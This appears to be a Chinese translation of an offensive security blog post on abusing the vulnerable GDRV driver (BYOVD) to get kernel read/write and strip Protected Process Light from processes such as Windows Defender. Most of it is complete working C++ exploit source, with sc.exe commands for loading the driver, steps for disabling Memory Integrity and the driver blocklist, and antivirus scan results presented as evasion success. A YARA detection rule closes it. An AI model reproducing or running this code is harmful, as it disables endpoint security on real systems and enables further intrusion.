#  滥用漏洞驱动 (BYOVD) 实现任意内核读写并绕过 PPL 保护  
S12
                    S12  securitainment   2026-03-21 14:42  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><p><span leaf="">原文链接</span></p></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://medium.com/@s12deff/abusing-a-vulnerable-driver-byovd-to-gain-arbitrary-kernel-r-w-and-bypass-ppl-protection-571552c7efc8</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">S12</span></section></td></tr></tbody></table>  
欢迎阅读这篇 Medium 文章。本文将介绍一种攻击性安全领域中的强大技术——通过滥用存在漏洞的驱动程序来绕过 Protected Process Light (PPL) 保护机制。  
  
该技术的核心思路非常简单：我们不直接利用内核漏洞，而是向系统加载一个合法但存在漏洞的驱动程序。该驱动程序为我们提供了在内核空间进行内存读写的能力。  
  
有了这些任意内核读/写原语之后，我们就可以修改操作系统中的关键结构。在本文中，我们将利用它们来禁用目标进程的 PPL 保护，从而能够与这些进程自由交互。  
  
以下是一系列关于 PPL 保护的讨论与实践文章：  
  
Windows PPL Evasion - Medium List  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiakpnibHDWagEFnibPt1VXOmGic90yBmkcs43UzwZfmgfGsHickkpvCdhZbfQkXaFTicqNTQupkjkTabDpRqFGzJJvzyKHRqiaia1nohE/640?wx_fmt=png&from=appmsg "")  
## 方法论  
  
在查看完整代码之前，我们先梳理整体逻辑。这有助于在动手实现之前理解整个 **流程**  
。  
  
要通过具备任意内核读/写能力的 BYOVD 实现 **PPL 绕过**  
，需要依次完成以下步骤：  
### 步骤 1：加载存在漏洞的驱动程序  
  
首先，我们需要在系统中加载并启动存在漏洞的驱动程序。这是整个技术的核心，因为它通过暴露的 IOCTL 或不安全的功能为我们提供了对内核内存的访问能力。  
### 步骤 2：启用所需权限  
  
驱动程序加载完成后，我们需要为当前进程启用 **SeDebugPrivilege**  
。这一步非常重要，因为它允许我们无限制地与受保护的系统进程进行交互。  
### 步骤 3：解析内核信息  
  
接下来，我们需要收集关键的内核信息，包括：  
- 获取 **ntoskrnl.exe**  
的基地址  
  
- 识别重要的结构偏移量 (通常针对目标操作系统版本进行硬编码)  
  
这一步至关重要，因为我们需要精确的内存位置才能安全地执行内核读/写操作。  
### 步骤 4：定位目标进程 (EPROCESS)  
  
获得内核基地址和偏移量之后，我们需要定位目标进程的 **EPROCESS**  
结构。这很重要，因为 PPL 保护正是通过该结构中的字段来实施的。  
### 步骤 5：修改保护 (禁用 PPL)  
  
借助任意内核读/写能力和目标进程的 EPROCESS，我们可以直接修改保护相关的字段。将这些值清零后，即可有效禁用目标进程的 PPL 保护，实现完全访问。  
### 最终状态  
  
至此，目标进程不再受 PPL 保护，我们可以自由地与其交互 (例如打开句柄、读写内存、注入代码等)。  
```
Userland Process
        │
        ▼
Load Vulnerable Driver (BYOVD)
        │
        ▼
Gain Kernel R/W
        │
        ▼
Locate ntoskrnl + EPROCESS
        │
        ▼
Modify Protection Fields
        │
        ▼
PPL Disabled
```  
## 实现  
  
现在，让我们看看如何将上述逻辑转化为 C++ 代码。以下是最关键部分的分解说明。  
### 加载存在漏洞的驱动程序  
  
本文使用的是与前一篇文章中相同的易受攻击的驱动程序——名为 **GDRV**  
的驱动，该驱动存在 **CVE-2018-19320**  
漏洞。  
  
可以直接从 **LolDrivers**  
网站下载该驱动程序，链接如下：  
  
gdrv.sys - LolDrivers  
  
要加载此驱动程序，你需要禁用 **Windows Memory Integrity**  
和 **Microsoft Vulnerable Driver Blocklist**  
，这两项均属于 **Kernel Isolation**  
安全功能的一部分 (或者使用一个未被列入黑名单的驱动程序)。  
  
加载驱动程序时，你可以使用 C++ 代码，也可以仅用于测试目的，在管理员权限的 CMD 中运行以下命令：  
```
sc.exe create gdrv.sys binPath=C:\windows\temp\gdrv.sys type=kernel && sc.exe start gdrv.sys
```  
### 启用所需权限  
  
用于获取 **SeDebugPrivilege**  
的代码是以下这个经典实现，因此你需要 **管理员权限**  
才能运行该程序：  
```
BOOL EnableSeDebugPrivilege(){
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
returnFALSE;
 }
if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
CloseHandle(hToken);
returnTRUE;
}
```  
### 解析内核信息  
  
接下来我们需要解析两项不同的信息：  
1. **内核偏移量**  
1. **ntoskrnl.exe 基地址**  
先从 **内核偏移量**  
开始：  
  
在我们的案例中直接使用了硬编码的值。在实际生产环境中，你需要通过在线符号引用来动态解析这些信息，或者在项目中为所有 Windows 版本硬编码所需的偏移量。  
  
在我的环境中，硬编码的偏移量如下：  
```
structoffsets {
 ULONG64 ActiveProcessLinks;
 ULONG64 UniqueProcessId;
 ULONG64 Protection;
 ULONG64 PsLoadedModuleList;
 ULONG64 PsInitialSystemProcess;
} g_offsets = {
0x1d8, // ActiveProcessLinks (Inspect the dt nt!_EPROCESS)0x1d0, // UniqueProcessId (Inspect the dt nt!_EPROCESS)0x5fa, // Protection (Inspect the dt nt!_EPROCESS)0xEF50C0, // PsLoadedModuleList (ntoskrnl.exe base address - PsLoadedModuleList = ? nt!PsLoadedModuleList - nt)0xFC5ab0// PsInitialSystemProcess (ntoskrnl.exe base address - PsInitialSystemProcess = ? nt!PsInitialSystemProcess - nt)};
```  
  
在前一篇文章中有关于如何从 **EPROCESS**  
获取偏移量的更多信息。  
  
现在，让我们来 **获取 ntoskrnl.exe 的基地址：**  
  
为此，我们只需要列出所有已加载的驱动程序，找到 **ntoskrnl.exe**  
并获取其基地址：  
  
**列出驱动程序：**  
```
std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
constint SystemModuleInformation = 11;

NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

if (status != 0) return driverList; // STATUS_SUCCESS = 0
auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

constchar* nameStart = reinterpret_cast<constchar*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
return a.BaseAddress < b.BaseAddress;
  });

return driverList;
}
```  
  
该函数使用 NtQuerySystemInformation  
获取所有已加载内核驱动程序的列表，将它们的基地址、大小和名称提取到一个 vector 中。最后按基地址排序，这对于定位 **ntoskrnl.exe**  
模块非常有用。  
  
然后我们只需将驱动程序列表传入以下函数：  
```
DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
if (drivers.empty()) {
return0;
 }

for (constauto& drv : drivers) {
  std::string nameLower = drv.Name;
std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
   nameLower.find("ntkrnl") != std::string::npos) {
return (DWORD64)drv.BaseAddress;
  }
 }

return0;
}
```  
  
该函数遍历驱动程序列表，查找 **ntoskrnl.exe**  
(或 **ntkrnl**  
)，找到后返回其基地址。  
### 定位目标进程 (EPROCESS)  
  
然后我们调用 getEPROCESS 函数，传入 **易受攻击驱动程序**  
的句柄、**ntoskrnl.exe**  
的 **基地址**  
以及 **目标进程 ID**  
。  
```
DWORD64 eprocess = getEPROCESS(drv, ntoskrnlBase, pid);
```  
  
在该函数内部，我们执行以下步骤：  
1. 通过 PsInitialSystemProcess  
获取 System 进程 (PID 4) 的 **EPROCESS**  
结构  
  
1. 利用 ActiveProcessLinks  
字段访问进程链表  
  
1. 通过 **Flink (前向链接)**  
遍历链表，逐个移动到下一个 EPROCESS  
  
1. 重复此过程直到找到目标 PID  
  
该函数之所以有效，是因为 Windows 中所有 **EPROCESS**  
结构都通过 ActiveProcessLinks  
字段以双向链表的形式连接在一起。我们从 **System 进程 (PID 4)**  
开始遍历，因为它始终可以通过 PsInitialSystemProcess  
访问。沿着 **Flink (前向链接)**  
指针，我们可以从一个进程移动到下一个进程。  
```
DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
if (ntoskrnlBase == 0)
 {
  std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
return0;
 }

 DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4) cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

getchar();
// Open Driver
getchar();
// Read Primitive to get EPROCESS structure from System Process DWORD64 systemEPROCESS = 0;
 BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
 cout << "System EPROCESS: " << systemEPROCESS << endl;


// Make sure that the EPROCESS is not from the PID 4 (System) DWORD systemPid = 0;
 BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
 cout << "System PID: " << systemPid << endl;
if (systemPid == pid) {
return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it }

// Walk through the whole list DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
 cout << "headList address :" << headList << endl;

// Get first process DWORD64 firstProcess = 0;
 BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
if (!readFirstResult) {
  cout << "Failed getting first process" << endl;
 }
 cout << "First Flink: " << firstProcess << endl;


 DWORD64 currentProcess = firstProcess;
int counter = 0;
getchar();
 cout << "Starting while " << endl;
while (currentProcess != headList && counter < 5000) {
  counter++;

  DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
  cout << "Checking EPROCESS " << eprocess << endl;

// Read PID  DWORD currentPid = 0;
  BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
if (!readPIDResult) {
   cout << "Error getting current PID " << endl;
  }
  cout << "Current PID " << currentPid << endl;

if (currentPid == pid) {
   cout << "Correct EPROCESS Found " << endl;
return eprocess;
  }

// Read next one  DWORD64 nextProcess = 0;
  BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
if (!readNextResult) {
   cout << "Error getting next result " << endl;
  }

  currentProcess = nextProcess;
 }

 cout << "PID Not found after checking all processes " << endl;
return0;
}
```  
### 修改保护 (禁用 PPL)  
  
当我们获得目标进程的 **EPROCESS**  
结构后，就可以使用之前发现的偏移量直接写入 Protection 结构的值：  
```
BOOL disablePPL(HANDLE drv, DWORD64 eprocess) {
// Offsets relative to the Protection field in EPROCESS// SignatureLevel        = Protection - 2// SectionSignatureLevel = Protection - 1// Protection            = Protection
 DWORD64 ppl = eprocess + g_offsets.Protection;
 BYTE zero = 0;

 DWORD value = 0;
 BOOL firstWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 2), &zero, sizeof(BYTE));
if (!firstWritePPL) {
  cout << "First error writing the PPL " << endl;
returnfalse;
 }

getchar();

 BOOL secondWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 1), &zero, sizeof(BYTE));
if (!secondWritePPL) {
  cout << "Second error writing the PPL " << endl;
returnfalse;
 }

getchar();


// Write Protection BOOL writePPL = WritePrimitive(drv, (LPVOID)ppl, &zero, sizeof(BYTE));
if (!writePPL) {
  cout << "Error writing the PPL " << endl;
returnfalse;
 }
 cout << "Successfully removed PPL" << endl;
returntrue;
}
```  
  
在该函数中，我们使用内核写原语直接修改目标进程 **EPROCESS**  
结构中与保护相关的字段。通过将 SignatureLevel  
、SectionSignatureLevel  
和 Protection  
的值覆写为零，我们有效地移除了 PPL 限制，使该进程不再受到保护 ;)  
## 完整代码  
  
以下是完整代码，本例中包含两个文件：  
  
**main.cpp**  
```
#include<Windows.h>
#include<winternl.h>
#include<vector>
#include<string>
#include<algorithm>
#include<iostream>
#include"DriverOps.h"

usingnamespacestd;

typedefstruct_SYSTEM_MODULE_ENTRY {
 HANDLE Section;
 PVOID MappedBase;
 PVOID ImageBase;
 ULONG ImageSize;
 ULONG Flags;
 USHORT LoadOrderIndex;
 USHORT InitOrderIndex;
 USHORT LoadCount;
 USHORT OffsetToFileName;
 UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedefstruct_SYSTEM_MODULE_INFORMATION {
 ULONG Count;
 SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

structKernelDriver {
 std::string Name;
uintptr_t BaseAddress;
uint32_tSize;
};

typedefNTSTATUS(NTAPI* pNtQuerySystemInformation)(
 SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 PULONG ReturnLength
 );

// 1- Enable SeDebugPrivilege for the current process// 2- Get offsets (hardcoded)// 3- List all drivers// 4- Get ntoskrnl.exe address// 5- Get EPROCESS of the target process// 6- Disable PPL
structoffsets {
 ULONG64 ActiveProcessLinks;
 ULONG64 UniqueProcessId;
 ULONG64 Protection;
 ULONG64 PsLoadedModuleList;
 ULONG64 PsInitialSystemProcess;
} g_offsets = {
0x1d8, // ActiveProcessLinks0x1d0, // UniqueProcessId0x5fa, // Protection0xEF50C0, // PsLoadedModuleList (ntoskrnl.exe base address - PsLoadedModuleList = ? nt!PsLoadedModuleList - nt)0xFC5ab0// PsInitialSystemProcess (ntoskrnl.exe base address - PsInitialSystemProcess = ? nt!PsInitialSystemProcess - nt)};

std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
constint SystemModuleInformation = 11;

NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

if (status != 0) return driverList; // STATUS_SUCCESS = 0
auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

constchar* nameStart = reinterpret_cast<constchar*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
return a.BaseAddress < b.BaseAddress;
  });

return driverList;
}

DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
if (drivers.empty()) {
return0;
 }

for (constauto& drv : drivers) {
  std::string nameLower = drv.Name;
std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
   nameLower.find("ntkrnl") != std::string::npos) {
return (DWORD64)drv.BaseAddress;
  }
 }

return0;
}

DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
if (ntoskrnlBase == 0)
 {
  std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
return0;
 }

 DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4) cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

getchar();
// Open Driver
getchar();
// Read Primitive to get EPROCESS structure from System Process DWORD64 systemEPROCESS = 0;
 BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
 cout << "System EPROCESS: " << systemEPROCESS << endl;


// Make sure that the EPROCESS is not from the PID 4 (System) DWORD systemPid = 0;
 BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
 cout << "System PID: " << systemPid << endl;
if (systemPid == pid) {
return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it }

// Walk through the whole list DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
 cout << "headList address :" << headList << endl;

// Get first process DWORD64 firstProcess = 0;
 BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
if (!readFirstResult) {
  cout << "Failed getting first process" << endl;
 }
 cout << "First Flink: " << firstProcess << endl;


 DWORD64 currentProcess = firstProcess;
int counter = 0;
getchar();
 cout << "Starting while " << endl;
while (currentProcess != headList && counter < 5000) {
  counter++;

  DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
  cout << "Checking EPROCESS " << eprocess << endl;

// Read PID  DWORD currentPid = 0;
  BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
if (!readPIDResult) {
   cout << "Error getting current PID " << endl;
  }
  cout << "Current PID " << currentPid << endl;

if (currentPid == pid) {
   cout << "Correct EPROCESS Found " << endl;
return eprocess;
  }

// Read next one  DWORD64 nextProcess = 0;
  BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
if (!readNextResult) {
   cout << "Error getting next result " << endl;
  }

  currentProcess = nextProcess;
 }

 cout << "PID Not found after checking all processes " << endl;
return0;
}

BOOL disablePPL(HANDLE drv, DWORD64 eprocess) {
// Offsets relative to the Protection field in EPROCESS// SignatureLevel        = Protection - 2// SectionSignatureLevel = Protection - 1// Protection            = Protection
 DWORD64 ppl = eprocess + g_offsets.Protection;
 BYTE zero = 0;

 DWORD value = 0;
 BOOL firstWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 2), &zero, sizeof(BYTE));
if (!firstWritePPL) {
  cout << "First error writing the PPL " << endl;
returnfalse;
 }

getchar();

 BOOL secondWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 1), &zero, sizeof(BYTE));
if (!secondWritePPL) {
  cout << "Second error writing the PPL " << endl;
returnfalse;
 }

getchar();


// Write Protection BOOL writePPL = WritePrimitive(drv, (LPVOID)ppl, &zero, sizeof(BYTE));
if (!writePPL) {
  cout << "Error writing the PPL " << endl;
returnfalse;
 }
 cout << "Successfully removed PPL" << endl;
returntrue;
}


BOOL EnableSeDebugPrivilege()
{
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
returnFALSE;
 }
if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
CloseHandle(hToken);
returnTRUE;
}


intmain(int argc, char* argv[])
{
 DWORD pid = 0;
if(argc > 1)
 {
  pid = atoi(argv[1]);
 }
else
 {
  std::cout << "Usage: PPLDisableFromRWKernel.exe <PID>" << std::endl;
return1;
 }

// 1. Enable SeDebugPrivilege for the current process BOOL setPriv = EnableSeDebugPrivilege();

// 2. Get offsets (hardcoded)
// 3. List all drivers vector<KernelDriver> drivers = GetSortedKernelDrivers();

// 4. Get ntoskrnl.exe address DWORD64 ntoskrnlBase = GetNtoskrnlBase(drivers);
 cout << "NTOSKRNL Base address " << ntoskrnlBase << endl;
getchar();

 HANDLE drv = openVulnDriver();

// 5. Get EPROCESS of the target process DWORD64 eprocess = getEPROCESS(drv, ntoskrnlBase, pid);
 cout << "EPROCESS " << eprocess << endl;
getchar();

if (eprocess) {
// 6- Disable PPL  BOOL finalDisable = disablePPL(drv, eprocess);
if (finalDisable) {
   cout << "[!] PPL Protection removed !" << endl;
return0;
  }
 }
return0;
}
```  
  
**DriverOps.h (来自前一篇文章)**  
```
#include<iostream>
#include<Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/
#defineIOCTL_READWRITE_PRIMITIVE0xC3502808

usingnamespacestd;

typedefstructKernelWritePrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelWritePrimitive;

typedefstructKernelReadPrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelWritePrimitive kwp;
 kwp.dst = dst;
 kwp.src = src;
 kwp.size = size;

 BYTE bufferReturned[48] = { 0 };
 DWORD returned = 0;
 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
if (!result) {
  cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
returnFALSE;
 }
 cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
returnTRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelReadPrimitive krp;
 krp.dst = dst;
 krp.src = src;
 krp.size = size;


 DWORD returned = 0;

 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
if (!result) {
  cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
returnFALSE;
 }
 cout << "Read primitive sent successfully. Bytes returned: " << returned << endl;
returnTRUE;
}

HANDLE openVulnDriver() {
 HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
if (!driver || driver == INVALID_HANDLE_VALUE)
 {
  cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
returnNULL;
 }
return driver;
}
```  
## 概念验证  
  
**Windows 11：**  
  
让我们来测试这段代码，首先确保服务正在运行：  
```
sc start gdrv
```  
  
然后在 **管理员**  
权限的 CMD 或 Powershell 控制台中执行：  
```
Checking EPROCESS 18446614925235277952
Read primitive sent successfully. Bytes returned: 0
Current PID 3412
Read primitive sent successfully. Bytes returned: 0
Checking EPROCESS 18446614925235253376
Read primitive sent successfully. Bytes returned: 0
Current PID 3432
Correct EPROCESS Found
EPROCESS 18446614925235253376

Disable PPL

Write primitive sent successfully. Bytes returned: 0

Write primitive sent successfully. Bytes returned: 0

Write primitive sent successfully. Bytes returned: 0
Successfully removed PPL
[!] PPL Protection removed !
```  
  
此时 Windows Defender 已不再受到保护：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShadcFPj8W2UuOW8JswA8xGesOwjEnwlwb4mafstHeBgDoOrXYP8pNCDBiadbXw4UvAU6GjWJE11UseX3ibFPGcMwVnQIdfCe4cE/640?wx_fmt=png&from=appmsg "")  
## 检测  
  
现在来看看防御措施是否将该 **.exe**  
检测为恶意威胁。驱动程序本身会被检测为恶意文件，因此你需要使用另一个未被列入黑名单的易受攻击驱动程序，例如：  
### Kleenscan  
```
Alyac: Undetected
Amiti: Undetected
Arcabit: Undetected
Avast: Undetected
AVG: Undetected
Avira: Undetected
Bullguard: Undetected
ClamAV: Undetected
Comodo Linux: Undetected
Crowdstrike Falcon: Undetected
DrWeb: Undetected
Emsisoft: Pending
eScan: Undetected
F-Prot: Undetected
F-Secure: Undetected
G Data: Undetected
IKARUS: Undetected
Immunet: Undetected
Kaspersky: Scan failed
Max Secure: Undetected
McAfee: Undetected
Microsoft Defender: Trojan:Win32/Sabsik.RD.A!ml
NANO: Undetected
NOD32: Undetected
Norman: Undetected
SecureAge APEX: Unknown
Seqrite: Undetected
Sophos: Undetected
Threatdown: Undetected
TrendMicro: Undetected
Vba32: Undetected
VirusFighter: Undetected
Xvirus: Undetected
Zillya: Undetected
Zonealarm: Undetected
Zoner: Undetected
```  
### Litterbox  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia8FQODhq7UekJY4OiatC5PuK3BnSOSzobQE8O8Qc6FGdOtobSYWicjOOshMc6olx9L4Jhm5TicibRqWzDVrgR44X4Thcc31H8wrBM/640?wx_fmt=png&from=appmsg "")  
### ThreatCheck  
```
ThreatCheck.exe -f Z:\PPLDisableFromRWKernel.exe
[+] No threat found!
[*] Run time: 0.81s
```  
### Windows Defender  
  
检测到 **驱动程序**  
存在漏洞，但未将 .exe 检测为恶意文件。  
### Kaspersky Free AV  
  
静态 .exe 分析：  
```
Instant File Analysis

    Status: Completed less than a minute ago

    Duration: 0 seconds

    Objects scanned: 2

    No threats have been detected
```  
  
**驱动程序被检测到**  
### Bitdefender Free AV  
  
静态 .exe 分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShgarG74vXGZ6Qf3icLO4iccrdZ7D7UX8YI4Fibyqjyhz3Zm3PpVI6uvrRhzHHhmviaklZPiaDpTKTzycr9hx5d8bFvuK3KyXS8z8icY/640?wx_fmt=png&from=appmsg "")  
  
**驱动程序被检测到**  
### YARA  
  
以下是一条用于检测该技术的 YARA 规则：  
```
rule BYOVD_KernelRW_PPL_Bypass_Generic
{
    meta:
        author = "0x12 Dark Development"
        description = "Detects potential BYOVD usage with kernel R/W primitives targeting PPL bypass"
        date = "2026-03-18"
        reference = "Generic detection for vulnerable driver abuse and PPL tampering"

    strings:
        // Native API usage for driver/module enumeration
        $ntquery = "NtQuerySystemInformation" ascii wide
        $sysinfo_class = "SystemModuleInformation" ascii wide

        // Kernel / driver related indicators
        $ntdll = "ntdll.dll" ascii wide
        $device = "\\\\.\\ " ascii wide nocase
        $ioctl = "DeviceIoControl" ascii wide

        // Common kernel structures / targets
        $eprocess = "EPROCESS" ascii wide nocase
        $protection = "Protection" ascii wide nocase
        $siglevel = "SignatureLevel" ascii wide nocase

        // Privilege escalation / debugging
        $sedebug = "SeDebugPrivilege" ascii wide

        // Typical kernel primitives naming (generic, not exact)
        $read = "ReadPrimitive" ascii wide nocase
        $write = "WritePrimitive" ascii wide nocase

        // Kernel base / ntoskrnl hunting
        $ntos = "ntoskrnl.exe" ascii wide nocase
        $psinit = "PsInitialSystemProcess" ascii wide
        $psloaded = "PsLoadedModuleList" ascii wide

    condition:
        // Require a combination of behaviors, not just one indicator
        (
            $ntquery and $sysinfo_class and
            2 of ($ntos, $psinit, $psloaded)
        )
        and
        (
            $ioctl or $device
        )
        and
        (
            2 of ($eprocess, $protection, $siglevel)
        )
        and
        (
            $write or $read
        )
}
```  
  
以下是我的 YARA 规则合集：  
  
S12cybersecurity/YaraRules - GitHub  
## 结论  
  
本文探讨了如何利用 BYOVD，借助任意内核读/写原语直接修改目标进程的 EPROCESS  
结构以绕过 PPL 保护。通过将存在漏洞的驱动程序与基于 PsInitialSystemProcess  
和 ActiveProcessLinks  
的内核结构遍历相结合，我们成功将 SignatureLevel  
、SectionSignatureLevel  
和 Protection  
字段清零，完全解除了 PPL 限制。  
  
